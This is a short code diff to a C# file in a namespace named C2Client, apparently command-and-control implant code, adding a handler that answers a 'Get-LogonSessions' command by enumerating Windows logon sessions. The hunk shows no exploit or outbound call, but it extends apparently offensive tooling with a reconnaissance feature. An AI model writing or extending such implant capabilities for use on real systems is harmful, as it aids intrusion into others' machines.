@@ -1392,6 +1392,12 @@ namespace C2Client
 
                     }
 
+                    else if (cmd == "Get-LogonSessions")
+                    {
+
+                       cmd= winapi.Getlogonsessions();
+                    }
+
                     else
                     {
                         Program p = new Program();
